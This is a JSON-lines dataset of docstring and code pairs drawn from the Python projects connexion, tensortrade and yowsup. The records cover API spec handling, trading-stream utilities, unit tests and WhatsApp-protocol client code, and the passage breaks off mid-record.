{"docstring": "# Errors should still result exceptions!\n", "func_signal": "def test_other_errors_stop_application_to_setup():\n", "code": "with pytest.raises(InvalidSpecification):\n    FlaskApi(TEST_FOLDER / \"fixtures/bad_specs/swagger.yaml\",\n             base_path=\"/api/v1.0\", arguments={'title': 'OK'})", "path": "connexion/tests/test_api.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"\nTakes in a path to a YAML file, and returns a Specification\n\"\"\"\n", "func_signal": "def from_file(cls, spec, arguments=None):\n", "code": "specification_path = pathlib.Path(spec)\nspec = cls._load_spec_from_file(arguments, specification_path)\nreturn cls.from_dict(spec)", "path": "connexion/connexion/spec.py", "commit_date": "2019-12-17 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"\nThe body complete definition for this operation.\n\n**There can be one \"body\" parameter at most.**\n\n:rtype: dict\n\"\"\"\n", "func_signal": "def body_definition(self):\n", "code": "body_parameters = [p for p in self.parameters if p['in'] == 'body']\nif len(body_parameters) > 1:\n    raise InvalidSpecification(\n        \"{method} {path} There can be one 'body' parameter at most\".format(\n            method=self.method,\n            path=self.path))\nreturn body_parameters[0] if body_parameters else {}", "path": "connexion/connexion/operations/swagger2.py", "commit_date": "2020-03-28 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"\nReturns example response from spec\n\"\"\"\n# simply use the first/lowest status code, this is probably 200 or 201\n", "func_signal": "def example_response(self, status_code=None, *args, **kwargs):\n", "code": "status_code = status_code or sorted(self._responses.keys())[0]\nexamples_path = [str(status_code), 'examples']\nschema_example_path = [str(status_code), 'schema', 'example']\nschema_path = [str(status_code), 'schema']\n\ntry:\n    status_code = int(status_code)\nexcept ValueError:\n    status_code = 200\ntry:\n    return (\n        list(deep_get(self._responses, examples_path).values())[0],\n        status_code\n    )\nexcept KeyError:\n    pass\ntry:\n    return (deep_get(self._responses, schema_example_path),\n            status_code)\nexcept KeyError:\n    pass\n\ntry:\n    return (self._nested_example(deep_get(self._responses, schema_path)),\n            status_code)\nexcept KeyError:\n    return (None, status_code)", "path": "connexion/connexion/operations/swagger2.py", "commit_date": "2020-03-28 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"Test that connexion will try to add an endpoint only on http methods.\n\ntest also that each http methods has its own endpoint.\n\"\"\"\n", "func_signal": "def test_using_all_fields_in_path_item(simple_api_spec_dir):\n", "code": "app = App(__name__, specification_dir=simple_api_spec_dir)\napp.add_api('openapi.yaml')\n\ntest_methods = set()\nfor rule in app.app.url_map.iter_rules():\n    if rule.rule != \"/v1.0/add_operation_on_http_methods_only\":\n        continue\n    test_methods.update({method.lower() for method in rule.methods})\nassert set(test_methods) == METHODS", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"\nResolve JSON references like {\"$ref\": <some URI>} in a spec.\nOptionally takes a store, which is a mapping from reference URLs to a\ndereferenced objects. Prepopulating the store can avoid network calls.\n\"\"\"\n", "func_signal": "def resolve_refs(spec, store=None, handlers=None):\n", "code": "spec = deepcopy(spec)\nstore = store or {}\nhandlers = handlers or default_handlers\nresolver = RefResolver('', spec, store, handlers=handlers)\n\ndef _do_resolve(node):\n    if isinstance(node, Mapping) and '$ref' in node:\n        path = node['$ref'][2:].split(\"/\")\n        try:\n            # resolve known references\n            node.update(deep_get(spec, path))\n            del node['$ref']\n            return node\n        except KeyError:\n            # resolve external references\n            with resolver.resolving(node['$ref']) as resolved:\n                return resolved\n    elif isinstance(node, Mapping):\n        for k, v in node.items():\n            node[k] = _do_resolve(v)\n    elif isinstance(node, (list, tuple)):\n        for i, _ in enumerate(node):\n            node[i] = _do_resolve(node[i])\n    return node\n\nres = _do_resolve(spec)\nreturn res", "path": "connexion/connexion/json_schema.py", "commit_date": "2019-10-27 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "# Create the app with a relative path and run the test_app testcase below.\n", "func_signal": "def test_app_with_different_server_option(simple_api_spec_dir, spec):\n", "code": "app = App(__name__, port=5001,\n          server='gevent',\n          specification_dir='..' / simple_api_spec_dir.relative_to(TEST_FOLDER),\n          debug=True)\napp.add_api(spec)\n\napp_client = app.app.test_client()\nget_bye = app_client.get('/v1.0/bye/jsantos')  # type: flask.Response\nassert get_bye.status_code == 200\nassert get_bye.data == b'Goodbye jsantos'", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"\nTest attribute error without import error on get_function_from_name.\nAttribute errors due to import errors are tested on\ntest_api.test_invalid_operation_does_stop_application_to_setup\n\"\"\"\n", "func_signal": "def test_get_function_from_name_attr_error(monkeypatch):\n", "code": "deep_attr_mock = MagicMock()\ndeep_attr_mock.side_effect = AttributeError\nmonkeypatch.setattr(\"connexion.utils.deep_getattr\", deep_attr_mock)\nwith pytest.raises(AttributeError):\n    utils.get_function_from_name('math.ceil')", "path": "connexion/tests/test_utils.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"Regression test for Python 2 UnicodeEncodeError bug during parameter parsing.\"\"\"\n", "func_signal": "def test_get_unicode_request(simple_app):\n", "code": "app_client = simple_app.app.test_client()\nresp = app_client.get('/v1.0/get_unicode_request?price=%C2%A319.99')  # \u00a319.99\nassert resp.status_code == 200\nassert json.loads(resp.data.decode('utf-8'))['price'] == '\u00a319.99'", "path": "connexion/tests/api/test_parameters.py", "commit_date": "2020-01-21 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\" Verify the spec yaml file is returned for default setting passed to app. \"\"\"\n", "func_signal": "def test_swagger_yaml_app(simple_api_spec_dir, spec):\n", "code": "app = App(__name__, port=5001, specification_dir=simple_api_spec_dir, debug=True)\napp.add_api(spec)\napp_client = app.app.test_client()\nurl = '/v1.0/{spec}'\nurl = url.format(spec=spec)\nspec_response = app_client.get(url)  # type: flask.Response\nassert spec_response.status_code == 200", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\" Verify the swagger-ui-config.json file is not returned when the swagger_ui_config option not passed to app. \"\"\"\n", "func_signal": "def test_no_swagger_ui_config_json(simple_api_spec_dir, spec):\n", "code": "app = App(__name__, port=5001, specification_dir=simple_api_spec_dir, debug=True)\napp.add_api(spec)\napp_client = app.app.test_client()\nurl = '/v1.0/ui/swagger-ui-config.json'\nswagger_ui_config_json = app_client.get(url)  # type: flask.Response\nassert swagger_ui_config_json.status_code == 404", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\" Verify the spec json file is returned for default setting passed to api. \"\"\"\n", "func_signal": "def test_swagger_json_api(simple_api_spec_dir, spec):\n", "code": "app = App(__name__, port=5001, specification_dir=simple_api_spec_dir, debug=True)\napp.add_api(spec)\n\napp_client = app.app.test_client()\nurl = '/v1.0/{spec}'.format(spec=spec.replace(\"yaml\", \"json\"))\nswagger_json = app_client.get(url)  # type: flask.Response\nassert swagger_json.status_code == 200", "path": "connexion/tests/api/test_bootstrap.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "spec-first/connexion", "stars": 4396, "license": "apache-2.0", "language": "python", "size": 16413}
{"docstring": "\"\"\"The components of the environment. (`Dict[str,Component]`, read-only)\"\"\"\n", "func_signal": "def components(self) -> 'Dict[str, Component]':\n", "code": "return {\n    \"action_scheme\": self.action_scheme,\n    \"reward_scheme\": self.reward_scheme,\n    \"observer\": self.observer,\n    \"stopper\": self.stopper,\n    \"informer\": self.informer,\n    \"renderer\": self.renderer\n}", "path": "tensortrade/tensortrade/env/generic/environment.py", "commit_date": "2020-11-04 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Computes a rolling median from the underlying stream.\n\nReturns\n-------\n`Stream[float]`\n    A rolling median stream.\n\"\"\"\n", "func_signal": "def median(self) -> \"Stream[float]\":\n", "code": "func = np.nanmedian if self.min_periods < self.window else np.median\nreturn self.agg(func).astype(\"float\")", "path": "tensortrade/tensortrade/feed/api/float/window/rolling.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Resets the environment.\n\nReturns\n-------\nobs : `np.array`\n    The first observation of the environment.\n\"\"\"\n", "func_signal": "def reset(self) -> 'np.array':\n", "code": "self.episode_id = str(uuid.uuid4())\nself.clock.reset()\n\nfor c in self.components.values():\n    if hasattr(c, \"reset\"):\n        c.reset()\n\nobs = self.observer.observe(self)\n\nself.clock.increment()\n\nreturn obs", "path": "tensortrade/tensortrade/env/generic/environment.py", "commit_date": "2020-11-04 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "# (left, right) : (float, Stream)\n", "func_signal": "def test_rsub():\n", "code": "s1 = 6\ns2 = Stream.source([1, 2, 3, 4, 5, 6], dtype=\"float\")\n\nw = (s1 - s2).rename(\"w\")\n\nassert_op([w], [5, 4, 3, 2, 1, 0])", "path": "tensortrade/tests/tensortrade/unit/feed/api/float/test_operations.py", "commit_date": "2020-07-27 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Runs all the streams in processing order.\"\"\"\n", "func_signal": "def run(self) -> None:\n", "code": "if not self.compiled:\n    self.compile()\n\nfor s in self.process:\n    s.run()\n\nsuper().run()", "path": "tensortrade/tensortrade/feed/core/feed.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Resets the broker.\"\"\"\n", "func_signal": "def reset(self) -> None:\n", "code": "self.unexecuted = []\nself.executed = {}\nself.trades = OrderedDict()", "path": "tensortrade/tensortrade/oms/orders/broker.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Computes a rolling variance from the underlying stream.\n\nReturns\n-------\n`Stream[float]`\n    A rolling variance stream.\n\"\"\"\n", "func_signal": "def var(self) -> \"Stream[float]\":\n", "code": "func1 = lambda x: np.nanvar(x, ddof=1)\nfunc2 = lambda x: np.var(x, ddof=1)\nfunc = func1 if self.min_periods < self.window else func2\nreturn self.agg(func).astype(\"float\")", "path": "tensortrade/tensortrade/feed/api/float/window/rolling.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "# (left, right) : (float, Stream)\n", "func_signal": "def test_radd():\n", "code": "s1 = 1\ns2 = Stream.source([1, 2, 3, 4, 5, 6], dtype=\"float\")\n\nw = (s1 + s2).rename(\"w\")\n\nassert_op([w], [2, 3, 4, 5, 6, 7])", "path": "tensortrade/tests/tensortrade/unit/feed/api/float/test_operations.py", "commit_date": "2020-07-27 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Computes a rolling sum from the underlying stream.\n\nReturns\n-------\n`Stream[float]`\n    A rolling sum stream.\n\"\"\"\n", "func_signal": "def sum(self) -> \"Stream[float]\":\n", "code": "func = np.nansum if self.min_periods < self.window else np.sum\nreturn self.agg(func).astype(\"float\")", "path": "tensortrade/tensortrade/feed/api/float/window/rolling.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Computes a rolling mean from the underlying stream.\n\nReturns\n-------\n`Stream[float]`\n    A rolling mean stream.\n\"\"\"\n", "func_signal": "def mean(self) -> \"Stream[float]\":\n", "code": "func = np.nanmean if self.min_periods < self.window else np.mean\nreturn self.agg(func).astype(\"float\")", "path": "tensortrade/tensortrade/feed/api/float/window/rolling.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Computes a rolling maximum from the underlying stream.\n\nReturns\n-------\n`Stream[float]`\n    A rolling maximum stream.\n\"\"\"\n", "func_signal": "def max(self) -> \"Stream[float]\":\n", "code": "func = np.nanmax if self.min_periods < self.window else np.max\nreturn self.agg(func).astype(\"float\")", "path": "tensortrade/tensortrade/feed/api/float/window/rolling.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Creates dictionary representation of specification.\n\nReturns\n-------\ndict\n    The dictionary representation of specification.\n\"\"\"\n", "func_signal": "def to_dict(self) -> dict:\n", "code": "return {\n    \"id\": self.id,\n    \"type\": self.type,\n    \"exchange_pair\": self.exchange_pair,\n    \"criteria\": self.criteria\n}", "path": "tensortrade/tensortrade/oms/orders/order_spec.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"All the exchanges in the portfolio. (`List[Exchange]`, read-only)\"\"\"\n", "func_signal": "def exchanges(self) -> 'List[Exchange]':\n", "code": "exchanges = []\nfor w in self.wallets:\n    if w.exchange not in exchanges:\n        exchanges += [w.exchange]\nreturn exchanges", "path": "tensortrade/tensortrade/oms/wallets/portfolio.py", "commit_date": "2020-08-30 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Compiles all the given stream together.\n\nOrganizes the order in which streams should be run to get valid output.\n\"\"\"\n", "func_signal": "def compile(self) -> None:\n", "code": "edges = self.gather()\n\nself.process = self.toposort(edges)\nself.compiled = True\nself.reset()", "path": "tensortrade/tensortrade/feed/core/feed.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Resets the `position` and `feed` of the reward scheme.\"\"\"\n", "func_signal": "def reset(self) -> None:\n", "code": "self.position = -1\nself.feed.reset()", "path": "tensortrade/tensortrade/env/default/rewards.py", "commit_date": "2020-09-15 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"All the exchange pairs in the portfolio. (`List[ExchangePair]`, read-only)\"\"\"\n", "func_signal": "def exchange_pairs(self) -> 'List[ExchangePair]':\n", "code": "exchange_pairs = []\nfor w in self.wallets:\n    if w.instrument != self.base_instrument:\n        exchange_pairs += [ExchangePair(w.exchange, self.base_instrument/w.instrument)]\nreturn exchange_pairs", "path": "tensortrade/tensortrade/oms/wallets/portfolio.py", "commit_date": "2020-08-30 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Updates the brokers order management system.\n\nThe broker will look through the unexecuted orders and if an order\nis ready to be executed the broker will submit it to the executed\nlist and execute the order.\n\nThen the broker will find any orders that are active, but expired, and\nproceed to cancel them.\n\"\"\"\n", "func_signal": "def update(self) -> None:\n", "code": "for order in self.unexecuted:\n    if order.is_executable:\n        self.unexecuted.remove(order)\n        self.executed[order.id] = order\n\n        order.attach(self)\n        order.execute()\n\nfor order in self.unexecuted + list(self.executed.values()):\n    if order.is_active and order.is_expired:\n        self.cancel(order)", "path": "tensortrade/tensortrade/oms/orders/broker.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Resets the portfolio.\"\"\"\n", "func_signal": "def reset(self) -> None:\n", "code": "self._initial_balance = self.base_balance\nself._initial_net_worth = None\nself._net_worth = None\nself._performance = None\n\nself.ledger.reset()\nfor wallet in self._wallets.values():\n    wallet.reset()", "path": "tensortrade/tensortrade/oms/wallets/portfolio.py", "commit_date": "2020-08-30 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"Computes a rolling minimum from the underlying stream.\n\nReturns\n-------\n`Stream[float]`\n    A rolling minimum stream.\n\"\"\"\n", "func_signal": "def min(self) -> \"Stream[float]\":\n", "code": "func = np.nanmin if self.min_periods < self.window else np.min\nreturn self.agg(func).astype(\"float\")", "path": "tensortrade/tensortrade/feed/api/float/window/rolling.py", "commit_date": "2020-12-28 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"The inverse price of the trading pair. (`Decimal, read-only)\"\"\"\n", "func_signal": "def inverse_price(self) -> \"Decimal\":\n", "code": "quantization = Decimal(10) ** -self.pair.quote.precision\nreturn Decimal(self.price ** Decimal(-1)).quantize(quantization)", "path": "tensortrade/tensortrade/oms/instruments/exchange_pair.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "tensortrade-org/tensortrade", "stars": 4345, "license": "apache-2.0", "language": "python", "size": 63937}
{"docstring": "\"\"\"\n:param protocolTreeNode: ProtocolTreeNode\n:return: bool\n\"\"\"\n#\n", "func_signal": "def __eq__(self, protocolTreeNode):\n", "code": "if protocolTreeNode.__class__ == ProtocolTreeNode\\\n    and self.tag == protocolTreeNode.tag\\\n    and self.data == protocolTreeNode.data\\\n    and self.attributes == protocolTreeNode.attributes\\\n    and len(self.getAllChildren()) == len(protocolTreeNode.getAllChildren()):\n        found = False\n        for c in self.getAllChildren():\n            for c2 in protocolTreeNode.getAllChildren():\n                if c == c2:\n                    found = True\n                    break\n            if not found:\n                return False\n\n        found = False\n        for c in protocolTreeNode.getAllChildren():\n            for c2 in self.getAllChildren():\n                if c == c2:\n                    found = True\n                    break\n            if not found:\n                return False\n\n        return True\n\nreturn False", "path": "yowsup/yowsup/structs/protocoltreenode.py", "commit_date": "2019-06-09 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:type entity: IqProtocolEntity\n\"\"\"\n", "func_signal": "def sendIq(self, entity):\n", "code": "if entity.getType() == IqProtocolEntity.TYPE_SET and entity.getXmlns() == \"w:m\":\n    #media upload!\n    self._sendIq(entity, self.onRequestUploadSuccess, self.onRequestUploadError)", "path": "yowsup/yowsup/layers/protocol_media/layer.py", "commit_date": "2019-05-08 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:type protocolTreeNode: ProtocolTreeNode\n\"\"\"\n", "func_signal": "def receive(self, protocolTreeNode):\n", "code": "if not self.processIqRegistry(protocolTreeNode):\n    if protocolTreeNode.tag == \"notification\" and protocolTreeNode[\"type\"] == \"encrypt\":\n        if protocolTreeNode.getChild(\"count\") is not None:\n            return self.onRequestKeysEncryptNotification(protocolTreeNode)\n        elif protocolTreeNode.getChild(\"identity\") is not None:\n            return self.onIdentityChangeEncryptNotification(protocolTreeNode)\n\n    self.toUpper(protocolTreeNode)", "path": "yowsup/yowsup/layers/axolotl/layer_control.py", "commit_date": "2019-05-05 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n       :type method: str\n       :param config_or_profile:\n       :type config: yowsup.config.v1.config.Config | YowProfile\n       \"\"\"\n\n", "func_signal": "def __init__(self, config_or_profile):\n", "code": "self.pvars = []\nself.port = 443\nself.type = \"GET\"\nself.parser = None\nself.params = []\nself.headers = {}\n\nself.sent = False\nself.response = None\n\nif isinstance(config_or_profile, Config):\n    logger.warning(\"Passing Config to WARequest is deprecated, pass a YowProfile instead\")\n    profile = YowProfile(config_or_profile.phone, config_or_profile)\nelse:\n    assert isinstance(config_or_profile, YowProfile)\n    profile = config_or_profile\n\nself._config = profile.config\nconfig = self._config\nself._p_in = str(config.phone)[len(str(config.cc)):]\nself._axolotlmanager = profile.axolotl_manager\n\nif config.expid is None:\n    config.expid = WATools.generateDeviceId()\n\nif config.fdid is None:\n    config.fdid = WATools.generatePhoneId()\n\nif config.client_static_keypair is None:\n    config.client_static_keypair = WATools.generateKeyPair()\n\nself.addParam(\"cc\", config.cc)\nself.addParam(\"in\", self._p_in)\nself.addParam(\"lg\", \"en\")\nself.addParam(\"lc\", \"GB\")\nself.addParam(\"mistyped\", \"6\")\nself.addParam(\"authkey\", self.b64encode(config.client_static_keypair.public.data))\nself.addParam(\"e_regid\", self.b64encode(struct.pack('>I', self._axolotlmanager.registration_id)))\nself.addParam(\"e_keytype\", self.b64encode(b\"\\x05\"))\nself.addParam(\"e_ident\", self.b64encode(self._axolotlmanager.identity.publicKey.serialize()[1:]))\n\nsignedprekey = self._axolotlmanager.load_latest_signed_prekey(generate=True)\nself.addParam(\"e_skey_id\", self.b64encode(struct.pack('>I', signedprekey.getId())[1:]))\nself.addParam(\"e_skey_val\", self.b64encode(signedprekey.getKeyPair().publicKey.serialize()[1:]))\nself.addParam(\"e_skey_sig\", self.b64encode(signedprekey.getSignature()))\n\nself.addParam(\"fdid\", config.fdid)\nself.addParam(\"expid\", self.b64encode(config.expid))\n\nself.addParam(\"network_radio_type\", \"1\")\nself.addParam(\"simnum\", \"1\")\nself.addParam(\"hasinrc\", \"1\")\nself.addParam(\"pid\", int(random.uniform(100, 9999)))\nself.addParam(\"rc\", 0)\nif self._config.id:\n    self.addParam(\"id\", self._config.id)", "path": "yowsup/yowsup/common/http/warequest.py", "commit_date": "2019-05-20 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:type method: str\n:param config:\n:type config: yowsup.config.v1.config.Config\n\"\"\"\n", "func_signal": "def __init__(self, method, config):\n", "code": "super(WACodeRequest,self).__init__(config)\n\nself.addParam(\"mcc\", config.mcc.zfill(3))\nself.addParam(\"mnc\", config.mnc.zfill(3))\nself.addParam(\"sim_mcc\", config.sim_mcc.zfill(3))\nself.addParam(\"sim_mnc\", config.sim_mnc.zfill(3))\nself.addParam(\"method\", method)\nself.addParam(\"reason\", \"\")\nself.addParam(\"token\", YowsupEnv.getCurrent().getToken(self._p_in))\nself.addParam(\"hasav\", \"1\")\n\nself.url = \"v.whatsapp.net/v2/code\"\n\nself.pvars = [\"status\",\"reason\",\"length\", \"method\", \"retry_after\", \"code\", \"param\"] +\\\n            [\"login\", \"type\", \"sms_wait\", \"voice_wait\"]\nself.setParser(JSONResponseParser())", "path": "yowsup/yowsup/registration/coderequest.py", "commit_date": "2019-05-21 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:param data:\n:type data: bytes\n:return:\n:rtype:\n\"\"\"\n", "func_signal": "def receive(self, data):\n", "code": "self._incoming_segments_queue.put(data)\nif not self._in_handshake():\n    self._flush_incoming_buffer()", "path": "yowsup/yowsup/layers/noise/layer.py", "commit_date": "2019-06-03 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:param params:\n:type params: list\n:param key:\n:type key: ECPublicKey\n:return:\n:rtype: list\n\"\"\"\n", "func_signal": "def encryptParams(self, params, key):\n", "code": "keypair = Curve.generateKeyPair()\nencodedparams = self.urlencodeParams(params)\n\ncipher = AESGCM(Curve.calculateAgreement(key, keypair.privateKey))\nciphertext = cipher.encrypt(b'\\x00\\x00\\x00\\x00' + struct.pack('>Q', 0), encodedparams.encode(), b'')\n\npayload = base64.b64encode(keypair.publicKey.serialize()[1:] + ciphertext)\nreturn [('ENC', payload)]", "path": "yowsup/yowsup/common/http/warequest.py", "commit_date": "2019-05-20 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "# type: (ImageAttributes, MessageMetaAttributes) -> None\n", "func_signal": "def __init__(self, image_attrs, message_meta_attrs):\n", "code": "super(ImageDownloadableMediaMessageProtocolEntity, self).__init__(\n    \"image\", MessageAttributes(image=image_attrs), message_meta_attrs\n)", "path": "yowsup/yowsup/layers/protocol_media/protocolentities/message_media_downloadable_image.py", "commit_date": "2019-05-29 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\nsends prekeys\n:return:\n:rtype:\n\"\"\"\n", "func_signal": "def flush_keys(self, signed_prekey, prekeys, reboot_connection=False):\n", "code": "preKeysDict = {}\nfor prekey in prekeys:\n    keyPair = prekey.getKeyPair()\n    preKeysDict[self.adjustId(prekey.getId())] = self.adjustArray(keyPair.getPublicKey().serialize()[1:])\n\nsignedKeyTuple = (self.adjustId(signed_prekey.getId()),\n                  self.adjustArray(signed_prekey.getKeyPair().getPublicKey().serialize()[1:]),\n                  self.adjustArray(signed_prekey.getSignature()))\n\nsetKeysIq = SetKeysIqProtocolEntity(\n    self.adjustArray(\n        self.manager.identity.getPublicKey().serialize()[1:]\n    ),\n    signedKeyTuple,\n    preKeysDict,\n    Curve.DJB_TYPE,\n    self.adjustId(self.manager.registration_id)\n)\n\nonResult = lambda _, __: self.on_keys_flushed(prekeys, reboot_connection=reboot_connection)\nself._sendIq(setKeysIq, onResult, self.onSentKeysError)", "path": "yowsup/yowsup/layers/axolotl/layer_control.py", "commit_date": "2019-05-05 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:type entity: IqProtocolEntity\n\"\"\"\n", "func_signal": "def processIqRegistry(self, entity):\n", "code": "if entity.getTag() == \"iq\":\n    iq_id = entity.getId()\n    if iq_id in self.iqRegistry:\n        originalIq, successClbk, errorClbk = self.iqRegistry[iq_id]\n        del self.iqRegistry[iq_id]\n\n        if entity.getType() == IqProtocolEntity.TYPE_RESULT and successClbk:\n            successClbk(entity, originalIq)\n        elif entity.getType() == IqProtocolEntity.TYPE_ERROR and errorClbk:\n            errorClbk(entity, originalIq)\n        return True\n\nreturn False", "path": "yowsup/yowsup/layers/interface/interface.py", "commit_date": "2019-04-23 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:param config:\n:type config: yowsup.config.base.config.Config\n:return:\n:rtype: bytes\n\"\"\"\n", "func_signal": "def serialize(self, config):\n", "code": "for transform in self._transforms:\n    config = transform.transform(config)\nreturn config", "path": "yowsup/yowsup/config/base/serialize.py", "commit_date": "2019-04-23 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\n:type cls: type\n:param data:\n:type data: bytes\n:return:\n:rtype: yowsup.config.base.config.Config\n\"\"\"\n", "func_signal": "def deserialize(self, data):\n", "code": "for transform in self._transforms[::-1]:\n    data = transform.reverse(data)\nreturn data", "path": "yowsup/yowsup/config/base/serialize.py", "commit_date": "2019-04-23 00:00:00", "repo_name": "tgalal/yowsup", "stars": 6988, "license": "gpl-3.0", "language": "python", "size": 1997}
{"docstring": "\"\"\"\nGroup send sequence:\ncheck if senderkeyrecord exists\n    no: - create,\n        - get group jids from info request\n        - for each jid without a session, get keys to create the session\n        - send message with dist key for all participants\n    yes:\n        - send skmsg without any dist key\n\nreceived retry for a participant\n    - request participants keys\n    - send message with dist key only + conversation, only for this participat\n\"\"\"\n", "func_signal": "def sendToGroup(self, node, retryReceiptEntity = None):\n", "code": "logger.debug(\"sendToGroup(node=[omitted], retryReceiptEntity=[%s])\" %\n             (\"[retry_count=%s, retry_jid=%s]\" % (\n                 retryReceiptEntity.getRetryCount(), retryReceiptEntity.getRetryJid())\n              ) if retryReceiptEntity is not None else None)\n\ngroupJid = node[\"to\"]\nownJid = self.getLayerInterface(YowAuthenticationProtocolLayer).getUsername(True)\n\nsenderKeyRecord = self.manager.load_senderkey(node[\"to\"])\n\ndef sendToGroup(resultNode, requestEntity):\n    groupInfo = InfoGroupsResultIqProtocolEntity.fromProtocolTreeNode(resultNode)\n    jids = list(groupInfo.getParticipants().keys()) #keys in py3 returns dict_keys\n    if ownJid in jids:\n        jids.remove(ownJid)\n    return self.ensureSessionsAndSendToGroup(node, jids)\n\nif senderKeyRecord.isEmpty():\n    logger.debug(\"senderKeyRecord is empty, requesting group info\")\n    groupInfoIq = InfoGroupsIqProtocolEntity(groupJid)\n    